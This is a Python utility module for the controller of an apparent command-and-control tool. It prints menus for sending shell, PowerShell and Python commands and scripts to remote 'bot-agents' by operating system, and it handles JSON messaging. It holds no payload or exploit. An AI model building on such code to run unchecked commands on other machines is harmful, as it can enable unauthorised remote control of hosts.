import os
import json
import logging

logger = logging.getLogger(__name__)


def print_help():
    print('''
    Welcome to Commander CLI!
    The following options are available:
    1) Execute shell/cmd commands
    2) Execute script
    ''')


def print_cmd_options():
    print("""
    The following options are available:
    1) Windows command - cmd/powershell
    2) Linux command - shell
    3) MacOS command - shell
    4) Generic command - command that can be processed by both Windows and Linux OS
    NOTE: If you choose 4 the command will be sent to all online bot-agents, if not it will be sent
    only to those online bot-agents running on the chosen OS type command
    5) Go back to previous menu
    """)


def print_script_help():
    print("""
    The following options are available:
    1) Powershell script - choosing this Windows filter will be automatically applied for bot-agents 
    2) Shell script - choosing this Linux & MacOS filters will be automatically applied for bot-agents
    3) Python script
    4) Go back to previous menu
    """)


def get_user_input(message):
    return input(f"{message}")


def check_if_number(value):
    try:
        val = int(value)
    except ValueError:
        print("You have not inserted a digit, please insert a digit.")
        return
    except Exception as err:
        print(f"An unexpected exception occurred while processing your choice. Please retry and insert a digit."
              f" This is the error: {err}")
        return
    return val


def check_if_path_is_valid(path_to_check):
    if os.path.isfile(path_to_check):
        return True


def json_deserialize(data, addr, uuid):
    try:
        json_item = json.loads(data.decode("utf-8"))
    except Exception as err:
        logger.error(f"Unexpected error when decoding getHostInfoReply from bot-agent {addr}-{uuid}: {err}.")
        return False
    return json_item


def json_serialize(data, message):
    try:
        payload = (json.dumps(data) + "\n").encode("utf-8")
    except Exception as err:
        logger.error(f"Unexpected error while serializing {message} message: {err}")
        return False
    return payload


def print_shell_note():
    print("NOTE: There is no validation performed by commander in regards to your command, so insert a valid "
          "one, if you insert an invalid one however you will just get the output and error for that command"
          " sent back by bot-agent, this note is just FYI.")
